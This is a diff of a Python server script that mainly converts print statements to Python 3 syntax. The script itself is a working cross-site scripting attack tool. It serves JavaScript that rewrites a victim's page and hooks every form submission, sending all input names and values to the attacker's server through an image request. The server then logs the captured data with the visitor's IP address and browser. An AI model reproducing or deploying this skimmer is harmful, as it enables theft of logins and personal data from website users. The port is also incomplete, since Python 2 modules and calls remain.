@@ -35,68 +35,68 @@ reports = "./reports"
 class RequestHandler(BaseHTTPRequestHandler):
 
 	def do_GET(self):
-		
+
 		try:
 			if re.search("^https?:\/\/(:?localhost|127)", self.headers["Referer"]) is None:
-				
-				
+
+
 				if self.path == '/':
-					print '[-] Incoming connection from %s' % self.client_address[0]
-					self.send_response(200) 
-					self.send_header('Content-Type', 'text/javascript')	
+					print ('[-] Incoming connection from %s' % self.client_address[0])
+					self.send_response(200)
+					self.send_header('Content-Type', 'text/javascript')
 					self.send_header('Cache-Control', 'no-cache, must-revalidate')
 					self.end_headers()
-					
-					print '[-] Grabbing payload from %s' % self.headers["Referer"]
+
+					print ('[-] Grabbing payload from %s' % self.headers["Referer"])
 					self.prep_payload()
-					
+
 					self.wfile.write(self.send_payload())
-					
-					print '[-] Exploit sent to %s' % self.client_address[0]
+
+					print ('[-] Exploit sent to %s' % self.client_address[0])
 				elif self.path[0:11] == '/spacer.gif':
-					print '[*] Rceiving data from %s' % self.client_address[0]
+					print ('[*] Rceiving data from %s' % self.client_address[0])
 					self.referer_host = self.headers["Referer"].replace("https://","").replace("http://","")
 					self.referer_host = self.referer_host.split("/")[0].split(".")
 					self.referer_host = self.referer_host[-2]+"."+self.referer_host[-1]
-					print self.referer_host
+					print (self.referer_host)
 					self.send_response(200)
 					self.send_header('Content-Type', 'image/gif')
 					self.send_header('Cache-Control', 'no-cache, must-revalidate')
 					self.end_headers()
 					self.capture()
-						
-				
+
+
 			else:
 				#self.headers["Referer"] = "http://google.com/"
-				print '[-] Incoming connection from %s' % self.client_address[0]
-				print '[!] No referer'
+				print ('[-] Incoming connection from %s' % self.client_address[0])
+				print ('[!] No referer')
 		except KeyError:
 			#self.headers["Referer"] = "http://google.com/"
-			print '[-] Incoming connection from %s' % self.client_address[0]
-			print '[!] No referer'
+			print ('[-] Incoming connection from %s' % self.client_address[0])
+			print ('[!] No referer')
 
 	def send_payload(self):
 		return self.payload
-	
+
 	def prep_payload(self):
 		js_payload = {}
 		js_payload[0]  = """
 				function func() {
 					document.getElementsByTagName('body')[0].innerHTML = \""""
 		js_payload[2]  = """\";
-		
+
 				var formslength =document.getElementsByTagName('form').length;
 				for(var i=0; i<formslength; i++){
 					document.forms[i].setAttribute('onsubmit', 'myOnSubmit('+i+')');
 				}
 			}
-		
+
 			function myOnSubmit(form) {
 				data = \"\";
 				for (i=0; i < document.forms[form].getElementsByTagName(\"input\").length; i++){
 						data = data+document.forms[form].getElementsByTagName(\"input\")[i].name+\"=\"+document.forms[form].getElementsByTagName(\"input\")[i].value+\"&\";
 				}
-		
+
 				var img = document.createElement('img');
 				img.src = \""""
 		js_payload[4] = """?\"+data+\"\";
@@ -106,38 +106,38 @@ class RequestHandler(BaseHTTPRequestHandler):
 					pause(500);
 					return true;
 				}
-		
+
 				function pause(milsec){
 					var date = new Date();
 					var curDate = null;
 					do { curDate = new Date(); }
 					while(curDate-date < milsec);
 				}
-		
+
 				func();
 				document.execCommand('Stop');
 				"""
-	
+
 		js_payload[1] = str(self.served())
 		js_payload[1] = js_payload[1].replace("\"","\\\"")
-		
-		
+
+
 		js_payload[3] = "http://"+self.headers["host"]+"/spacer.gif"
-		
+
 		full_payload = ""
-		
+
 		#js_payload[0] = js_payload[0].replace("\t","").replace(","")
 		js_payload[1] = js_payload[1].replace("\t","").replace("\n","").replace("\r","")
 		#js_payload[2] = js_payload[2].replace("\t","").replace(","")
 		#js_payload[4] = js_payload[4].replace("\t","").replace(","")
-		
+
 		for i in js_payload:
 			#if i != 1 or i != 3:
 				#js_payload[i] = tmp.replace(" ","").replace("\t","").replace(","")
 			full_payload += str(js_payload[i])
 		#self.payload = full_payload.replace(" ","").replace("\t","").replace(","")
 		self.payload = full_payload
-		
+
 	def served(self):
 		t = urllib2.urlopen(self.headers["Referer"])
 		html = t.read()
@@ -150,46 +150,46 @@ class RequestHandler(BaseHTTPRequestHandler):
 		self.generated_on = str(datetime.datetime.now())
 		self.path = self.path.split("?")[1].split(" ")[0]
 		dict = urlparse.parse_qs(self.path)
-		
+
 		meta = {}
 		meta['ip'] = self.client_address
 		meta['browser'] = [self.headers["User-Agent"]]
 		meta['referer'] = [self.headers["Referer"]]
-		
-		
-		print "[+] Generating XML.."
-		
+
+
+		print ("[+] Generating XML..")
+
 		root = Element('XSS')
 		root.set('version', '1.0')
 		request = SubElement(root, 'request')
-		
-			
+
+
 		site = SubElement(request, 'site')
 		site.text = self.address_string()
 		date = SubElement(request, 'date')
 		date.text = self.generated_on
 		requestLine = SubElement(request, 'requestLine')
 		requestLine.text = self.requestline
-		
-		
+
+
 		metaData = SubElement(request, 'meta')
 		for key, value in meta.iteritems():
 			ele = SubElement(metaData, key)
 			#print value
 			ele.text = value[0]
-		
-		
+
+
 		formData = SubElement(request, 'formData')
-		
-		print '[*] Data received:'
+
+		print ('[*] Data received:')
 		for key, value in dict.iteritems():
 			if key == "":
 				key = "UNDEFINED"
-			print '[-] \t '+ str(key)+' => '+str(value)
+			print ('[-] \t '+ str(key)+' => '+str(value))
 			ele = SubElement(formData, key)
 			ele.text = value[0]
-		
-			
+
+
 		self.log_data(self.prettify(root))
 
 
@@ -206,10 +206,10 @@ class RequestHandler(BaseHTTPRequestHandler):
 		report.write(data)
 		report.close
 
-print "Starting server on %s:%s...\n" % (bind,port)
+print ("Starting server on %s:%s...\n" % (bind,port))
 try:
 	serv = HTTPServer((bind, port), RequestHandler)
-	print "[*] Server has started"
+	print ("[*] Server has started")
 	serv.serve_forever()
 except:
-	print "Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port)
+	print ("Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port))
